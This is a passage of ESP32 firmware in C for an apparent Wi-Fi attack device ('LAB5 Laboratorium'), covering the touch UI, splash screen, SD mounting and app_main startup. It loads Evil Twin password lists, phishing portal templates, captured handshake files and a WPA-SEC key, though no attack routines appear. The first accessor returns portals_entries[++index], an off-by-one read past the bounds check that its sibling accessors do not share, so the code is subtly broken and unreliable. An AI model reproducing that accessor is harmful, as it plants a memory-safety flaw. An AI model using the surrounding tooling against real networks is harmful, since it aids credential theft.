    if (sd_cache == NULL || index < 0 || index >= sd_cache->portals_count) return NULL;
    return sd_cache->portals_entries[++index];
}

int sd_cache_get_handshake_count(void) {
    return sd_cache ? sd_cache->handshake_count : 0;
}

const char* sd_cache_get_handshake_name(int index) {
    if (sd_cache == NULL || index < 0 || index >= sd_cache->handshake_count) return NULL;
    return sd_cache->handshake_names[index];
}

int sd_cache_get_html_count(void) {
    return sd_cache ? sd_cache->html_count : 0;
}

const char* sd_cache_get_html_filename(int index) {
    if (sd_cache == NULL || index < 0 || index >= sd_cache->html_count) return NULL;
    return sd_cache->html_filenames[index];
}

// ============================================================================
// SD Loading Popup Functions
// ============================================================================

static void show_sd_loading_popup(const char *text) {
    if (sd_loading_popup != NULL) {
        // Already showing, just update text
        if (sd_loading_label) {
            lv_label_set_text(sd_loading_label, text);
        }
        return;
    }
    
    sd_loading_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(sd_loading_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(sd_loading_popup, 0, 0);
    style_modal_overlay(sd_loading_popup, dark_mode_enabled ? LV_OPA_50 : LV_OPA_30);

    lv_obj_t *dialog = lv_obj_create(sd_loading_popup);
    lv_obj_set_size(dialog, LCD_H_RES - 20, 100);
    lv_obj_center(dialog);
    style_popup_card(dialog, 10, ui_accent_color());
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create label
    sd_loading_label = lv_label_create(dialog);
    lv_label_set_text(sd_loading_label, text);
    lv_obj_set_style_text_color(sd_loading_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(sd_loading_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_align(sd_loading_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_center(sd_loading_label);
    
    // Force immediate refresh
    lv_obj_invalidate(lv_scr_act());
    lv_refr_now(NULL);
    
    ESP_LOGI(TAG, "SD loading popup shown: %s", text);
}

static void update_sd_loading_popup(const char *text) {
    if (sd_loading_label != NULL) {
        lv_label_set_text(sd_loading_label, text);
        lv_obj_invalidate(lv_scr_act());
        lv_refr_now(NULL);
        ESP_LOGI(TAG, "SD loading popup updated: %s", text);
    }
}

static void hide_sd_loading_popup(void) {
    if (sd_loading_popup != NULL) {
        lv_obj_del(sd_loading_popup);
        sd_loading_popup = NULL;
        sd_loading_label = NULL;
        lv_obj_invalidate(lv_scr_act());
        lv_refr_now(NULL);
        ESP_LOGI(TAG, "SD loading popup hidden");
    }
}

static void show_sd_fatal_error_and_halt(void) {
    led_set(0, 0, 0);  // LED off on fatal halt
    // Build a fresh screen so this works regardless of splash/home UI state
    if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
        lv_obj_t *err_scr = lv_obj_create(NULL);
        lv_obj_set_style_bg_color(err_scr, lv_color_hex(0x1a0000), 0);
        lv_obj_set_style_bg_opa(err_scr, LV_OPA_COVER, 0);

        lv_obj_t *lbl = lv_label_create(err_scr);
        lv_label_set_text(lbl, "SD Card Failed!\n\nRequires FAT32\n(<= 32 GB)\n\nReset to retry");
        lv_obj_set_style_text_color(lbl, lv_color_hex(0xff4444), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_align(lbl, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_width(lbl, LV_PCT(90));
        lv_obj_center(lbl);

        lv_scr_load(err_scr);
        lv_refr_now(NULL);
        xSemaphoreGive(lvgl_mutex);
    }
    // Keep display alive; halt until hardware reset
    while (1) {
        if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(50)) == pdTRUE) {
            lv_task_handler();
            xSemaphoreGive(lvgl_mutex);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}

// ============================================================================
// SD Cache Load All Data
// ============================================================================

static bool is_html_file(const char *name) {
    if (!name) return false;
    const char *dot = strrchr(name, '.');
    if (!dot) return false;
    return (strcasecmp(dot, ".html") == 0 || strcasecmp(dot, ".htm") == 0);
}

static esp_err_t sd_cache_load_all(void) {
    if (sd_cache == NULL) {
        ESP_LOGE(TAG, "SD cache not initialized");
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Loading SD card data into cache...");
    
    // 1. Load whitelist (uses existing function)
    load_whitelist_from_sd();
    ESP_LOGI(TAG, "  Whitelist: %d entries", whitelistedBssidsCount);
    
    // 2. Load eviltwin.txt
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "r");
    if (file != NULL) {
        char line[SD_CACHE_MAX_ENTRY_LEN];
        while (fgets(line, sizeof(line), file) != NULL) {
            // Remove trailing newline
            line[strcspn(line, "\r\n")] = '\0';
            if (strlen(line) > 0) {
                sd_cache_add_eviltwin_entry(line);
            }
        }
        fclose(file);
        ESP_LOGI(TAG, "  Evil Twin passwords: %d entries", sd_cache->eviltwin_count);
    } else {
        ESP_LOGI(TAG, "  Evil Twin passwords: 0 (file not found)");
    }
    
    // 3. Load portals.txt
    file = fopen("/sdcard/lab/portals.txt", "r");
    if (file != NULL) {
        char line[SD_CACHE_MAX_ENTRY_LEN];
        while (fgets(line, sizeof(line), file) != NULL) {
            // Remove trailing newline
            line[strcspn(line, "\r\n")] = '\0';
            if (strlen(line) > 0) {
                sd_cache_add_portal_entry(line);
            }
        }
        fclose(file);
        ESP_LOGI(TAG, "  Portal data: %d entries", sd_cache->portals_count);
    } else {
        ESP_LOGI(TAG, "  Portal data: 0 (file not found)");
    }
    
    // 4. Load HTML filenames from /sdcard/lab/htmls/
    DIR *dir = opendir("/sdcard/lab/htmls");
    if (dir != NULL) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && sd_cache->html_count < SD_CACHE_MAX_HTML_FILES) {
            if (entry->d_name[0] == '.') continue;
            if (!is_html_file(entry->d_name)) continue;
            
            // Verify it's a regular file
            char full_path[280];  // 18 bytes prefix + up to 255 bytes d_name + null
            snprintf(full_path, sizeof(full_path), "/sdcard/lab/htmls/%s", entry->d_name);
            struct stat st;
            if (stat(full_path, &st) == 0 && S_ISREG(st.st_mode)) {
                sd_cache_add_html_filename(entry->d_name);
            }
        }
        closedir(dir);
        
        // Sort HTML filenames alphabetically
        if (sd_cache->html_count > 1) {
            for (int i = 0; i < sd_cache->html_count - 1; i++) {
                for (int j = i + 1; j < sd_cache->html_count; j++) {
                    if (strcasecmp(sd_cache->html_filenames[i], sd_cache->html_filenames[j]) > 0) {
                        char *tmp = sd_cache->html_filenames[i];
                        sd_cache->html_filenames[i] = sd_cache->html_filenames[j];
                        sd_cache->html_filenames[j] = tmp;
                    }
                }
            }
        }
        ESP_LOGI(TAG, "  HTML templates: %d files", sd_cache->html_count);
    } else {
        ESP_LOGI(TAG, "  HTML templates: 0 (directory not found)");
    }
    
    // 5. Load handshake filenames from /sdcard/lab/handshakes/
    dir = opendir("/sdcard/lab/handshakes");
    if (dir != NULL) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && sd_cache->handshake_count < SD_CACHE_MAX_HANDSHAKES) {
            // Only include .pcap files (skip .hccapx)
            if (strstr(entry->d_name, ".pcap") != NULL && strstr(entry->d_name, ".hccapx") == NULL) {
                sd_cache_add_handshake_name(entry->d_name);
            }
        }
        closedir(dir);
        ESP_LOGI(TAG, "  Handshakes: %d files", sd_cache->handshake_count);
    } else {
        ESP_LOGI(TAG, "  Handshakes: 0 (directory not found)");
    }
    
    // 6. Load WPA-SEC API key from wpa-sec.txt
    sd_cache->wpasec_key[0] = '\0';
    file = fopen(WPASEC_KEY_PATH, "r");
    if (file != NULL) {
        char buf[WPASEC_KEY_MAX_LEN + 8];
        if (fgets(buf, sizeof(buf), file) != NULL) {
            size_t len = strlen(buf);
            while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
                   buf[len - 1] == ' ' || buf[len - 1] == '\t')) {
                buf[--len] = '\0';
            }
            char *start = buf;
            while (*start == ' ' || *start == '\t') start++;
            if (strlen(start) > 0 && strlen(start) < WPASEC_KEY_MAX_LEN) {
                strncpy(sd_cache->wpasec_key, start, WPASEC_KEY_MAX_LEN - 1);
                sd_cache->wpasec_key[WPASEC_KEY_MAX_LEN - 1] = '\0';
            }
        }
        fclose(file);
        ESP_LOGI(TAG, "  WPA-SEC key: %.4s****", sd_cache->wpasec_key);
    } else {
        ESP_LOGI(TAG, "  WPA-SEC key: not found");
    }
    
    sd_cache->loaded = true;
    ESP_LOGI(TAG, "SD cache loading complete");
    return ESP_OK;
}

// ============================================================================
// Splash Screen
// ============================================================================
static lv_obj_t  *splash_screen          = NULL;
static lv_obj_t  *splash_loading_label   = NULL;
static lv_obj_t  *splash_detecting_label = NULL;
static lv_timer_t *splash_timer          = NULL;
static int         glitch_frame          = 0;
static bool        splash_detection_started = false;

static void create_home_ui(void);

static void detection_complete_cb(lv_timer_t *timer)
{
    (void)timer;
    if (splash_timer) { lv_timer_del(splash_timer); splash_timer = NULL; }
    if (splash_screen) { lv_obj_del(splash_screen); splash_screen = NULL; }
    splash_loading_label = NULL;
    splash_detecting_label = NULL;
    create_home_ui();
    lv_obj_invalidate(lv_scr_act());
}

static void splash_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    glitch_frame++;

    if (splash_loading_label) {
        static const char *frames[] = {
            "LOADING", "LOADING.", "LOADING..", "LOADING..."
        };
        lv_label_set_text(splash_loading_label, frames[(glitch_frame / 3) % 4]);
        lv_obj_set_style_text_opa(splash_loading_label,
            (glitch_frame % 10 < 6) ? LV_OPA_100 : LV_OPA_60, 0);
    }

    if (glitch_frame >= 8 && splash_detecting_label) {
        lv_obj_clear_flag(splash_detecting_label, LV_OBJ_FLAG_HIDDEN);
    }

    if (!splash_detection_started && glitch_frame >= 10) {
        splash_detection_started = true;
        lv_timer_t *det = lv_timer_create(detection_complete_cb, 200, NULL);
        lv_timer_set_repeat_count(det, 1);
    }
}

static void show_splash_screen(void)
{
    glitch_frame = 0;
    splash_detection_started = false;

    splash_screen = lv_obj_create(lv_scr_act());
    lv_obj_remove_style_all(splash_screen);
    lv_obj_set_size(splash_screen, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(splash_screen, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(splash_screen, LV_OPA_COVER, 0);
    lv_obj_clear_flag(splash_screen, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *dexter = lv_img_create(splash_screen);
    lv_img_set_src(dexter, &dexter_img);
    lv_obj_align(dexter, LV_ALIGN_CENTER, 0, -80);

    lv_obj_t *title = lv_label_create(splash_screen);
    lv_label_set_text(title, "LAB5");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MAGENTA, 0);
    lv_obj_set_style_text_letter_space(title, 4, 0);
    lv_obj_align(title, LV_ALIGN_CENTER, 0, 22);

    lv_obj_t *subtitle = lv_label_create(splash_screen);
    lv_label_set_text(subtitle, "LABORATORIUM");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x93A6BC), 0);
    lv_obj_set_style_text_letter_space(subtitle, 2, 0);
    lv_obj_align(subtitle, LV_ALIGN_CENTER, 0, 46);

    lv_obj_t *version_label = lv_label_create(splash_screen);
    lv_label_set_text(version_label, FW_VERSION);
    lv_obj_set_style_text_font(version_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(version_label, lv_color_hex(0xD8D8D8), 0);
    lv_obj_align(version_label, LV_ALIGN_CENTER, 0, 64);

    splash_loading_label = lv_label_create(splash_screen);
    lv_label_set_text(splash_loading_label, "LOADING...");
    lv_obj_set_style_text_font(splash_loading_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(splash_loading_label, lv_color_hex(0xD8D8D8), 0);
    lv_obj_align(splash_loading_label, LV_ALIGN_BOTTOM_MID, 0, -50);

    splash_detecting_label = lv_label_create(splash_screen);
    lv_label_set_text(splash_detecting_label, "Detecting devices...");
    lv_obj_set_style_text_font(splash_detecting_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(splash_detecting_label, lv_color_hex(0x9FE7D8), 0);
    lv_obj_align(splash_detecting_label, LV_ALIGN_BOTTOM_MID, 0, -28);
    lv_obj_add_flag(splash_detecting_label, LV_OBJ_FLAG_HIDDEN);

    splash_timer = lv_timer_create(splash_timer_cb, 100, NULL);
}

static void create_home_ui(void)
{
    title_bar = lv_obj_create(lv_scr_act());
    lv_obj_set_size(title_bar, lv_pct(100), 30);
    lv_obj_align(title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(title_bar, ui_panel_color(), 0);
    lv_obj_set_style_bg_opa(title_bar, LV_OPA_70, 0);
    lv_obj_set_style_border_width(title_bar, 0, 0);
    lv_obj_set_style_radius(title_bar, 0, 0);
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *title_label = lv_label_create(title_bar);
    lv_label_set_text(title_label, "Laboratorium");
    lv_obj_set_style_text_color(title_label, ui_text_color(), 0);
    lv_obj_center(title_label);
    lv_obj_add_flag(title_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(title_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);

    battery_label = lv_label_create(title_bar);
    lv_label_set_text(battery_label, last_voltage_str);
    lv_obj_set_style_text_color(battery_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(battery_label, &lv_font_montserrat_12, 0);
    lv_obj_align(battery_label, LV_ALIGN_RIGHT_MID, -8, 0);
    if (last_voltage_str[0] == '\0') lv_obj_add_flag(battery_label, LV_OBJ_FLAG_HIDDEN);

    show_main_tiles();
}

void app_main(void)
{
	//Initialize GPS UART and start background monitor task
	if (init_gps_uart() == ESP_OK) {
		ESP_LOGI(TAG, "GPS UART initialized on TX=%d RX=%d", GPS_TX_PIN, GPS_RX_PIN);
		// Allocate GPS task stack from PSRAM
		gps_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
		if (gps_task_stack != NULL) {
			TaskHandle_t task_handle = xTaskCreateStatic(gps_task, "gps_task", 4096, NULL, 
				tskIDLE_PRIORITY + 1, gps_task_stack, &gps_task_buffer);
			if (task_handle == NULL) {
				ESP_LOGE(TAG, "Failed to start GPS task");
				heap_caps_free(gps_task_stack);
				gps_task_stack = NULL;
			} else {
				ESP_LOGI(TAG, "GPS monitor running in background (PSRAM) (log every few seconds)");
			}
		} else {
			ESP_LOGE(TAG, "Failed to allocate GPS task stack from PSRAM");
		}
	} else {
		ESP_LOGE(TAG, "GPS UART init failed");
	}
    
    // Initialize WiFi CLI system (WiFi, LED, all components)
    esp_err_t ret = wifi_cli_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "WiFi CLI init FAILED: %s", esp_err_to_name(ret));
    } else {
        ESP_LOGI(TAG, "WiFi CLI system initialized OK");
        current_radio_mode = RADIO_MODE_WIFI;
        wifi_initialized = true;
    }

    // Load screen settings (timeout, brightness) from NVS
    nvs_settings_load();

    // Init scanner and register event handler
    wifi_scanner_init();
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_scan_done_cb, NULL);

    // Allocate sniffer handshake + wardrive promisc arrays in PSRAM
    hs_ap_targets = (hs_ap_target_t *)heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_SPIRAM);
    hs_clients = (hs_client_entry_t *)heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_SPIRAM);
    ducb_channels = (ducb_channel_t *)heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_SPIRAM);
    wdp_seen_networks = (wdp_network_t *)heap_caps_calloc(WDP_INITIAL_CAPACITY, sizeof(wdp_network_t), MALLOC_CAP_SPIRAM);
    wdp_seen_capacity = WDP_INITIAL_CAPACITY;
    if (!hs_ap_targets || !hs_clients || !ducb_channels || !wdp_seen_networks) {
        ESP_LOGE(TAG, "PSRAM alloc FAILED!");
    }

    lvgl_memory_init();
    lv_init();
    init_display();
    init_touch();
    init_backlight();
    init_boot_button();

    ESP_LOGI(TAG, "=== SD CARD INIT DISABLED ===");
    ESP_LOGI(TAG, "[INIT] SD card will be mounted lazily on first use");
    ESP_LOGI(TAG, "[INIT] System works without SD card - no blocking on startup");
         
    // Create LVGL mutex for thread safety
    lvgl_mutex = xSemaphoreCreateMutex();
    if (lvgl_mutex == NULL) {
        ESP_LOGE(TAG, "Failed to create LVGL mutex!");
        return;
    }
    
    // Create SD/SPI mutex (SD and display share same SPI bus)
    sd_spi_mutex = xSemaphoreCreateMutex();
    if (sd_spi_mutex == NULL) {
        ESP_LOGE(TAG, "Failed to create SD/SPI mutex!");
        return;
    }

    gw_init(sd_spi_mutex);

    // Screenshot worker (queue + background saver task)
    screenshot_queue = xQueueCreate(1, sizeof(screenshot_msg_t));
    if (screenshot_queue == NULL) {
        ESP_LOGE(TAG, "Failed to create screenshot queue!");
        return;
    }

    screenshot_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (screenshot_task_stack != NULL) {
        screenshot_task_handle = xTaskCreateStatic(
            screenshot_save_task,
            "shot_save",
            4096,
            NULL,
            tskIDLE_PRIORITY + 2,
            screenshot_task_stack,
            &screenshot_task_buffer);
        if (screenshot_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create screenshot save task");
            heap_caps_free(screenshot_task_stack);
            screenshot_task_stack = NULL;
            return;
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate screenshot task stack");
        return;
    }

    // For 32-bit color depth, we need to reduce buffer size due to memory constraints
    // 15 lines * 480 pixels * 4 bytes = 28.8 KB per buffer (vs 28.8 KB for 30 lines @ 16-bit)
    const size_t buf_size = LCD_H_RES * 15 * sizeof(lv_color_t);
    buf1 = spi_bus_dma_memory_alloc(LCD_HOST, buf_size, 0);
    buf2 = spi_bus_dma_memory_alloc(LCD_HOST, buf_size, 0);
    if (buf1 == NULL || buf2 == NULL) {
        ESP_LOGE(TAG, "Failed to allocate draw buffers!");
        return;
    }
    ESP_LOGI(TAG, "Display buffers allocated: buf1=%p, buf2=%p (size: %zu bytes each)", buf1, buf2, buf_size);

    lv_disp_draw_buf_init(&draw_buf, buf1, buf2, LCD_H_RES * 15);
    static lv_disp_drv_t disp_drv;
    lv_disp_drv_init(&disp_drv);
    disp_drv.hor_res = LCD_H_RES;
    disp_drv.ver_res = LCD_V_RES;
    disp_drv.flush_cb = lvgl_flush_cb;
    disp_drv.draw_buf = &draw_buf;
    disp_drv.user_data = panel_handle;
    lv_disp_drv_register(&disp_drv);

    flush_done_sem = xSemaphoreCreateBinary();
    if (flush_done_sem == NULL) {
        ESP_LOGE(TAG, "Failed to create flush_done_sem!");
        return;
    }

    const esp_lcd_panel_io_callbacks_t cbs = {
        .on_color_trans_done = on_color_trans_done,
    };
    ESP_ERROR_CHECK(esp_lcd_panel_io_register_event_callbacks(lcd_io_handle, &cbs, &disp_drv));

    uint16_t black = 0x0000;
    for (int i = 0; i < LCD_H_RES * 30; i++) {
        ((uint16_t*)buf1)[i] = black;
    }
    for (int y = 0; y < LCD_V_RES; y += 30) {
        int lines = (y + 30 <= LCD_V_RES) ? 30 : (LCD_V_RES - y);
        esp_lcd_panel_draw_bitmap(panel_handle, 0, y, LCD_H_RES, y + lines, buf1);
    }
    
    lv_obj_set_style_bg_color(lv_scr_act(), lv_color_black(), 0);

    ESP_LOGI(TAG, "LVGL OBJECTS:");

    lv_obj_set_style_bg_color(lv_scr_act(), ui_bg_color(), 0);

    show_splash_screen();
    
    // DEBUG: Visual touch indicator (red dot)
    touch_dot = lv_obj_create(lv_scr_act());
    lv_obj_set_size(touch_dot, 10, 10);
    lv_obj_set_style_bg_color(touch_dot, lv_color_make(255, 0, 0), 0);
    lv_obj_set_style_border_width(touch_dot, 0, 0);
    lv_obj_set_style_radius(touch_dot, 5, 0);
    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_FLOATING);
    
    lv_obj_invalidate(lv_scr_act());
    lv_refr_now(NULL);
    
    // Now that UI is fully created, turn on display (prevents boot flash)
    ESP_ERROR_CHECK(esp_lcd_panel_disp_on_off(panel_handle, true));

    // Create software brightness overlay on lv_layer_top()
    // This sits above all content but does NOT intercept touch events
    brightness_overlay = lv_obj_create(lv_layer_top());
    lv_obj_set_size(brightness_overlay, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(brightness_overlay, 0, 0);
    lv_obj_set_style_bg_color(brightness_overlay, lv_color_black(), 0);
    lv_obj_set_style_border_width(brightness_overlay, 0, 0);
    lv_obj_set_style_radius(brightness_overlay, 0, 0);
    lv_obj_clear_flag(brightness_overlay, LV_OBJ_FLAG_CLICKABLE);   // Touch passes through
    lv_obj_clear_flag(brightness_overlay, LV_OBJ_FLAG_SCROLLABLE);
    set_backlight_percent(screen_brightness_pct);

    last_input_ms = esp_timer_get_time() / 1000;
    
    vTaskDelay(pdMS_TO_TICKS(100));
    
    static lv_indev_drv_t indev_drv;
    lv_indev_drv_init(&indev_drv);
    indev_drv.type = LV_INDEV_TYPE_POINTER;
    indev_drv.read_cb = lvgl_touch_read_cb;
    indev_drv.user_data = &touch_handle;
    lv_indev_drv_register(&indev_drv);

    if (screen_idle_timer == NULL) {
        screen_idle_timer = lv_timer_create(screen_idle_timer_cb, SCREEN_INACTIVITY_CHECK_MS, NULL);
        // If "Stays on" (timeout == 0), pause the timer immediately
        if (screen_timeout_ms == 0) {
            lv_timer_pause(screen_idle_timer);
            ESP_LOGI(TAG, "Screen timeout: Stays on (timer paused)");
        } else {
            ESP_LOGI(TAG, "Screen timeout: %ldms", (long)screen_timeout_ms);
        }
    }

    const esp_timer_create_args_t periodic_timer_args = {
        .callback = &lvgl_tick_task,
        .name = "lvgl_tick"
    };
    esp_timer_handle_t periodic_timer;
    ESP_ERROR_CHECK(esp_timer_create(&periodic_timer_args, &periodic_timer));
    ESP_ERROR_CHECK(esp_timer_start_periodic(periodic_timer, 10 * 1000));
    
    // Initialize portal HTML buffer (1MB in PSRAM for large HTML files up to 900KB)
    ESP_LOGI(TAG, "Initializing portal HTML buffer in PSRAM...");
    esp_err_t html_ret = wifi_attacks_init_portal_html_buffer();
    if (html_ret == ESP_OK) {
        ESP_LOGI(TAG, "Portal HTML buffer ready (1MB PSRAM allocated)");
    } else {
        ESP_LOGW(TAG, "Portal HTML buffer allocation failed - large HTML files may not work");
    }
    
    // ========================================================================
    // SD Card Initialization with Modal Popup
    // ========================================================================
    
    // Initialize SD cache structure in PSRAM
    esp_err_t cache_ret = sd_cache_init();
    if (cache_ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to initialize SD cache - halting");
        show_sd_loading_popup("PSRAM Error!\nCannot allocate cache");
        while (1) { vTaskDelay(pdMS_TO_TICKS(1000)); }
    }
    
    // Cancel splash auto-transition — SD init controls the splash timing
    if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(500)) == pdTRUE) {
        if (splash_timer) { lv_timer_del(splash_timer); splash_timer = NULL; }
        xSemaphoreGive(lvgl_mutex);
    }

    // Hold splash screen for 2 seconds so user can see it
    for (int i = 0; i < 20; i++) {
        if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
            lv_task_handler();
            xSemaphoreGive(lvgl_mutex);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    // Show loading popup
    show_sd_loading_popup("Reading SD card...");

    // Try to mount SD card - 3 attempts, then continue without it
    bool sd_mounted = false;
    const int SD_MAX_ATTEMPTS = 3;
    for (int mount_attempts = 1; mount_attempts <= SD_MAX_ATTEMPTS && !sd_mounted; mount_attempts++) {
        ESP_LOGI(TAG, "[SD] Mount attempt %d/%d...", mount_attempts, SD_MAX_ATTEMPTS);

        char attempt_msg[40];
        snprintf(attempt_msg, sizeof(attempt_msg), "Reading SD... (%d/%d)", mount_attempts, SD_MAX_ATTEMPTS);
        update_sd_loading_popup(attempt_msg);

        // Take SD/SPI mutex before mounting
        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
            esp_err_t sd_ret = wifi_wardrive_init_sd();
            xSemaphoreGive(sd_spi_mutex);

            if (sd_ret == ESP_OK) {
                sd_mounted_lazy = true;
                sd_mounted = true;
                ESP_LOGI(TAG, "[SD] Card mounted successfully");
            } else {
                ESP_LOGW(TAG, "[SD] Mount failed (%d/%d): %s", mount_attempts, SD_MAX_ATTEMPTS, esp_err_to_name(sd_ret));
                if (mount_attempts < SD_MAX_ATTEMPTS) {
                    char fail_msg[48];
                    snprintf(fail_msg, sizeof(fail_msg), "Attempt %d/%d failed\nRetrying...", mount_attempts, SD_MAX_ATTEMPTS);
                    update_sd_loading_popup(fail_msg);
                    // 2 second delay with LVGL processing before retry
                    for (int i = 0; i < 20; i++) {
                        if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
                            lv_task_handler();
                            xSemaphoreGive(lvgl_mutex);
                        }
                        vTaskDelay(pdMS_TO_TICKS(100));
                    }
                }
            }
        } else {
            ESP_LOGW(TAG, "[SD] Could not take SPI mutex");
            vTaskDelay(pdMS_TO_TICKS(500));
        }
    }
    if (!sd_mounted) {
        ESP_LOGW(TAG, "[SD] No SD card after %d attempts - halting", SD_MAX_ATTEMPTS);
        show_sd_fatal_error_and_halt();
    }
    
    // Load all data from SD into cache
    update_sd_loading_popup("Loading data...");
    if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
        lv_task_handler();
        xSemaphoreGive(lvgl_mutex);
    }
    
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(10000)) == pdTRUE) {
        sd_cache_load_all();
        xSemaphoreGive(sd_spi_mutex);
    }
    
    // Hide popup
    hide_sd_loading_popup();

    // Check for calibration reset trigger file on SD card
    if (sd_mounted_lazy) {
        struct stat st;
        if (stat("/sdcard/calibrate.txt", &st) == 0) {
            ESP_LOGI(TAG, "Found /sdcard/calibrate.txt — scheduling touch calibration");
            remove("/sdcard/calibrate.txt");
            touch_cal_needed = true;
        }
    }
    // Also calibrate on first boot (no NVS calibration saved yet)
    if (!touch_cal_loaded) {
        touch_cal_needed = true;
    }

    // Brief splash hold so user can read the boot screen, then transition
    vTaskDelay(pdMS_TO_TICKS(2000));

    // Transition splash → home UI directly (deterministic — no LVGL timer dependency)
    if (splash_timer) { lv_timer_del(splash_timer); splash_timer = NULL; }
    if (splash_screen) { lv_obj_del(splash_screen); splash_screen = NULL; }
    splash_loading_label = NULL;
    splash_detecting_label = NULL;

    // Run calibration if needed (first boot or SD trigger file found)
    if (touch_cal_needed) {
        touch_cal_needed = false;
        run_touch_calibration();
    }

    create_home_ui();
    lv_obj_invalidate(lv_scr_act());
    lv_refr_now(NULL);

    ESP_LOGI(TAG, "System ready!");
    ESP_LOGI(TAG, "[DIAG] System ready - final memory state");
    check_heap_integrity("Before main loop");
    print_memory_stats();
    
    // Battery ADC disabled: GPIO6 = SPI SCK on NM-CYD-C5, ADC would reconfigure it
    if (false && init_battery_adc() == ESP_OK) {
        battery_task_stack = (StackType_t *)heap_caps_malloc(2048 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
        if (battery_task_stack != NULL) {
            battery_task_handle = xTaskCreateStatic(battery_monitor_task, "bat_mon", 2048, NULL,
                tskIDLE_PRIORITY + 1, battery_task_stack, &battery_task_buffer);
            if (battery_task_handle == NULL) {
                ESP_LOGE(TAG, "Failed to create battery monitor task");
                heap_caps_free(battery_task_stack);
                battery_task_stack = NULL;
            } else {
                ESP_LOGI(TAG, "Battery monitor task running (PSRAM stack, 30s refresh)");
            }
        } else {
            ESP_LOGE(TAG, "Failed to allocate battery task stack from PSRAM");
        }
    } else {
        ESP_LOGW(TAG, "Battery ADC init failed - voltage monitor disabled");
    }

    // Subscribe main task to watchdog to prevent IDLE task starvation during LVGL rendering
    esp_task_wdt_add(NULL);
    ESP_LOGI(TAG, "Main task subscribed to watchdog");

    ESP_LOGI(TAG, "Main event loop started");

    // Initial LED state
    led_update_mode();
    uint32_t last_led_update_ms = esp_timer_get_time() / 1000;

    while (1) {

        // Wake from Go Dark: poll BOOT button
        // Double-click (window starts at first RELEASE, not first press) or 2s hold.
        if (go_dark_active) {
            uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
            bool btn_pressed = (gpio_get_level(BOOT_BTN_GPIO) == 0);

            // Falling edge: start hold timer
            if (btn_pressed && !boot_btn_prev_pressed) {
                boot_btn_hold_start_ms = now_ms;
            }

            // Rising edge: count the click; window is from first RELEASE
            if (!btn_pressed && boot_btn_prev_pressed) {
                boot_btn_hold_start_ms = 0;
                boot_btn_click_count++;
                boot_btn_last_release_ms = now_ms;
                if (boot_btn_click_count >= 2) {
                    go_dark_disable();
                    boot_btn_click_count = 0;
                }
            }

            // Long-press fallback: hold ≥ 2s
            if (btn_pressed && boot_btn_hold_start_ms > 0 &&
                (now_ms - boot_btn_hold_start_ms) >= 2000) {
                go_dark_disable();
                boot_btn_hold_start_ms = 0;
                boot_btn_click_count   = 0;
            }

            // Timeout: if no second click within 800ms of first release, reset
            if (boot_btn_click_count > 0 && !btn_pressed &&
                (now_ms - boot_btn_last_release_ms) > GO_DARK_DBL_CLICK_MS) {
                boot_btn_click_count = 0;
            }

